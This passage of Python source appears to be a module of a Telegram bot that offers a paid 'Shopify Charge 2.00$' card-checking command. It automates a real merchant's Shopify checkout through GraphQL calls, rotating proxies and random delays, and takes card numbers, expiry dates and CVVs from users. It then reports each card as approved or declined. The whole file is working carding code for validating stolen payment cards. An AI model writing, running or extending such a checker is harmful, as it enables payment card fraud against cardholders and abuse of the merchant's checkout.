                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": "USD",
                        "countryCode": "US"
                    },
                    "email": self.email,
                    "emailChanged": False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [{
                        "email": {"value": self.email}
                    }],
                    "shopPayOptInPhone": {"countryCode": "US"},
                    "rememberMe": False
                },
                "tip": {"tipLines": []},
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": []
                },
                "note": {"message": None, "customAttributes": []},
                "shopPayArtifact": {
                    "optIn": {
                        "vaultEmail": "",
                        "vaultPhone": "",
                        "optInSource": "REMEMBER_ME"
                    }
                },
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": []
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields": []
            },
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {
                "requestUrl": f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us",
                "pageId": self.generate_uuid().upper()
            }
        }
        
        payload = {
            "operationName": "SubmitForCompletion",
            "variables": variables,
            "id": self.submit_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=SubmitForCompletion",
                headers=graphql_headers,
                json=payload,
                timeout=25
            )
            
            if resp.status_code != 200:
                return False, f"Submit failed: {resp.status_code}"
            
            try:
                submit_resp = resp.json()
                
                # Check for errors in response
                if 'errors' in submit_resp and submit_resp['errors']:
                    error_msgs = []
                    for error in submit_resp['errors']:
                        error_code = error.get('code', 'UNKNOWN')
                        error_msgs.append(error_code)
                    return False, f"DECLINED - {', '.join(error_msgs)}"
                
                data = submit_resp.get('data', {}).get('submitForCompletion', {})
                receipt = data.get('receipt', {})
                self.receipt_id = receipt.get('id')
                
                if not self.receipt_id:
                    return False, "DECLINED - No receipt ID"
                
                self.logger.data_extracted("Receipt ID", self.receipt_id.split('/')[-1], "Submit")
                
                # Check receipt type
                receipt_type = receipt.get('__typename', '')
                
                if receipt_type == 'ProcessingReceipt':
                    poll_delay = receipt.get('pollDelay', 500) / 1000
                    self.step(9, "POLL RECEIPT", f"Waiting {poll_delay}s", f"Delay: {poll_delay}s", "WAIT")
                    await asyncio.sleep(poll_delay)
                    return await self.poll_receipt(graphql_headers)
                    
                elif receipt_type == 'ProcessedReceipt':
                    return True, "ORDER_PLACED"
                    
                elif receipt_type == 'FailedReceipt':
                    error_info = receipt.get('processingError', {})
                    error_code = error_info.get('code', 'GENERIC_ERROR')
                    return False, f"DECLINED - {error_code}"
                    
                else:
                    return False, f"Unknown receipt type: {receipt_type}"
                    
            except Exception as e:
                return False, f"Failed to parse submit response: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on submit: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on submit: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("SUBMIT_ERROR", str(e))
            return False, f"Submit error: {str(e)[:50]}"

    async def poll_receipt(self, headers, max_polls=5):
        """Step 10: Poll for receipt status"""
        self.step(10, "POLL RECEIPT", "Polling for payment status")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        poll_attempts = 0
        max_attempts = max_polls
        base_delay = 0.5
        
        while poll_attempts < max_attempts:
            poll_attempts += 1
            
            try:
                poll_params = {
                    'operationName': 'PollForReceipt',
                    'variables': json.dumps({
                        "receiptId": self.receipt_id,
                        "sessionToken": self.graphql_session_token
                    }),
                    'id': self.poll_id
                }
                
                resp = await self.client.get(
                    graphql_url,
                    headers={**headers, 'accept': 'application/json'},
                    params=poll_params,
                    timeout=25
                )
                
                if resp.status_code != 200:
                    # Try POST if GET fails
                    poll_payload = {
                        "operationName": "PollForReceipt",
                        "variables": {
                            "receiptId": self.receipt_id,
                            "sessionToken": self.graphql_session_token
                        },
                        "id": self.poll_id
                    }
                    resp = await self.client.post(
                        graphql_url + "?operationName=PollForReceipt",
                        headers=headers,
                        json=poll_payload,
                        timeout=25
                    )
                
                if resp.status_code != 200:
                    if poll_attempts < max_attempts:
                        self.logger.step(10, "POLL RECEIPT RETRY", f"Attempt {poll_attempts} failed, retrying...", f"Status: {resp.status_code}", "WAIT")
                        await asyncio.sleep(base_delay * poll_attempts)
                        continue
                    return False, f"Poll failed after {max_attempts} attempts"
                
                try:
                    poll_resp = resp.json()
                    receipt_data = poll_resp.get('data', {}).get('receipt', {})
                    
                    receipt_type = receipt_data.get('__typename', '')
                    
                    if receipt_type == 'FailedReceipt':
                        error_info = receipt_data.get('processingError', {})
                        error_code = error_info.get('code', 'GENERIC_ERROR')
                        return False, f"DECLINED - {error_code}"
                        
                    elif receipt_type == 'ProcessedReceipt':
                        self.logger.success_log("Payment processed successfully", f"After {poll_attempts} attempts")
                        return True, "ORDER_PLACED"
                        
                    elif receipt_type == 'ProcessingReceipt':
                        if poll_attempts < max_attempts:
                            poll_delay = receipt_data.get('pollDelay', 500) / 1000
                            wait_time = max(poll_delay, base_delay * poll_attempts)
                            self.step(10, "POLL RECEIPT", f"Still processing, attempt {poll_attempts}/{max_attempts}", f"Waiting {wait_time:.1f}s", "WAIT")
                            await asyncio.sleep(wait_time)
                            continue
                        else:
                            self.logger.error_log("PROCESSING", f"Payment still processing after {max_attempts} attempts")
                            return False, "DECLINED - PROCESSING_TIMEOUT"
                    
                    else:
                        if poll_attempts < max_attempts:
                            await asyncio.sleep(base_delay)
                            continue
                        return False, f"Unknown receipt status: {receipt_type}"
                        
                except Exception as e:
                    if poll_attempts < max_attempts:
                        self.logger.step(10, "POLL RECEIPT RETRY", f"Parse error, retrying...", str(e)[:50], "WAIT")
                        await asyncio.sleep(base_delay)
                        continue
                    return False, f"Failed to parse poll response: {str(e)[:50]}"
                    
            except httpx.TimeoutException as e:
                if poll_attempts < max_attempts:
                    self.logger.step(10, "POLL RECEIPT RETRY", f"Timeout on attempt {poll_attempts}, retrying...", "", "WAIT")
                    await asyncio.sleep(base_delay)
                    continue
                self.logger.error_log("TIMEOUT", f"Timeout on poll after {max_attempts} attempts")
                return False, "TIMEOUT"
                
            except Exception as e:
                if poll_attempts < max_attempts:
                    self.logger.step(10, "POLL RECEIPT RETRY", f"Error on attempt {poll_attempts}, retrying...", str(e)[:50], "WAIT")
                    await asyncio.sleep(base_delay)
                    continue
                return False, f"Poll error: {str(e)[:50]}"
        
        return False, "DECLINED - TIMEOUT"

    async def execute_checkout(self, cc, mes, ano, cvv):
        """Main checkout execution flow for Kauffman Center postcard using direct checkout"""
        try:
            # Step 0: Get proxy
            self.step(0, "GET PROXY", "Getting proxy")
            
            if PROXY_SYSTEM_AVAILABLE:
                self.proxy_url = get_proxy_for_user(self.user_id, "random")
                if not self.proxy_url:
                    self.logger.error_log("NO_PROXY", "No working proxies available")
                    return False, "NO_PROXY_AVAILABLE"
                
                self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=25, follow_redirects=True)
                self.proxy_status = "Live ⚡️"
                self.proxy_used = True
                self.logger.data_extracted("Proxy", f"{self.proxy_url[:30]}...", "Proxy System")
            else:
                self.proxy_status = "No Proxy"
                self.client = httpx.AsyncClient(timeout=25, follow_redirects=True)
            
            # Step 1: Direct checkout access (skips product page and add to cart)
            success, result = await self.direct_checkout_access()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 2: Get session token
            success, result = await self.get_session_token()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 3: Submit proposal
            success, result = await self.submit_proposal()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 4: Update contact with email
            success, result = await self.update_contact_info()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 5: Select pickup delivery
            success, result = await self.select_pickup_delivery()
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 6: Create payment session
            success, payment_session_id = await self.create_payment_session(cc, mes, ano, cvv)
            if not success:
                return False, payment_session_id
            await self.random_delay(0.3, 0.5)
            
            # Step 7: Update billing address
            success, result = await self.update_billing_address(payment_session_id)
            if not success:
                return False, result
            await self.random_delay(0.3, 0.5)
            
            # Step 8: Submit for completion
            success, result = await self.submit_for_completion(payment_session_id)
            
            return success, result
            
        except Exception as e:
            self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
            return False, f"Checkout error: {str(e)[:50]}"
        finally:
            if self.client:
                await self.client.aclose()


# ========== MAIN CHECKER CLASS ==========
class ShopifyKauffmanChecker:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.logger = ShopifyLogger(user_id)
        self.proxy_status = "Dead 🚫"

    async def check_card(self, card_details, username, user_data):
        """Main card checking method for Kauffman Center postcard"""
        start_time = time.time()

        self.logger = ShopifyLogger(self.user_id)
        self.logger.start_check(card_details)

        try:
            # Use intelligent parser to extract card details
            parsed = parse_card_input(card_details)
            if not parsed:
                elapsed_time = time.time() - start_time
                return format_shopify_response("", "", "", "", "Invalid card format", elapsed_time, username, user_data, self.proxy_status)

            cc, mes, ano, cvv = parsed

            # Basic validation
            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data, self.proxy_status)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data, self.proxy_status)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data, self.proxy_status)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data, self.proxy_status)

            self.logger.card_details_log(cc, mes, ano, cvv)

            # Create checker instance
            checker = ShopifyKauffmanCheckout(self.user_id)
            success, result = await checker.execute_checkout(cc, mes, ano, cvv)
            
            # Update proxy status
            self.proxy_status = checker.proxy_status

            elapsed_time = time.time() - start_time

            if success:
                self.logger.complete_result(True, "APPROVED", result, elapsed_time)
            else:
                self.logger.complete_result(False, "DECLINED", result, elapsed_time)

            return format_shopify_response(cc, mes, ano, cvv, result, elapsed_time, username, user_data, self.proxy_status)

        except Exception as e:
            elapsed_time = time.time() - start_time
            self.logger.error_log("UNKNOWN", str(e))
            try:
                cc = parsed[0] if 'parsed' in locals() else ""
                mes = parsed[1] if 'parsed' in locals() else ""
                ano = parsed[2] if 'parsed' in locals() else ""
                cvv = parsed[3] if 'parsed' in locals() else ""
            except:
                cc = mes = ano = cvv = ""
            error_msg = str(e)
            if ":" in error_msg:
                error_msg = error_msg.split(":")[0].strip()
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {error_msg[:30]}", elapsed_time, username, user_data, self.proxy_status)


# ========== COMMAND HANDLER ==========
@Client.on_message(filters.command(["si", ".si", "$si"]))
@auth_and_free_restricted
async def handle_shopify_kauffman(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        can_use, wait_time = check_cooldown(user_id, "si")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE 2.00$]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/si</code>
🠪 <b>Usage</b>: <code>/si cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/si 4111111111111111|12|2030|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Shopify Charge 2$ - Direct Checkout</code>""")
            return

        # Get the full message text after the command
        full_text = message.text
        # Remove the command part
        command_parts = full_text.split(maxsplit=1)
        if len(command_parts) < 2:
            await message.reply("Please provide card details")
            return
        
        card_input = command_parts[1].strip()

        # Parse using the intelligent parser
        parsed = parse_card_input(card_input)
        if not parsed:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Could not extract card details.
🠪 <b>Format 1</b>: <code>cc|mm|yy|cvv</code>
━━━━━━━━━━━━━""")
            return

        cc, mes, ano, cvv = parsed

        processing_msg = await message.reply(
            f"""
<b>[#Shopify Charge 2.00$] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 2.00$ (Direct)</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Initiating...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Processing... Please wait.</b>
"""
        )

        checker = ShopifyKauffmanChecker(user_id)

        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
            try:
                result = await charge_processor.execute_charge_command(
                    user_id,
                    checker.check_card,
                    card_input,  # Pass original input
                    username,
                    user_data,
                    credits_needed=2,
                    command_name="si",
                    gateway_name="Shopify Charge 2.00$"
                )

                if isinstance(result, tuple) and len(result) == 3:
                    success, result_text, credits_deducted = result
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                elif isinstance(result, str):
                    await processing_msg.edit_text(result, disable_web_page_preview=True)
                else:
                    result_text = await checker.check_card(card_input, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)

            except Exception as e:
                print(f"❌ Charge processor error: {str(e)}")
                try:
                    result_text = await checker.check_card(card_input, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                except Exception as inner_e:
                    await processing_msg.edit_text(
                        f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(inner_e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                    )
        else:
            try:
                result_text = await checker.check_card(card_input, username, user_data)
                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
            except Exception as e:
                await processing_msg.edit_text(
                    f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: `{str(e)[:100]}`
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                )

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
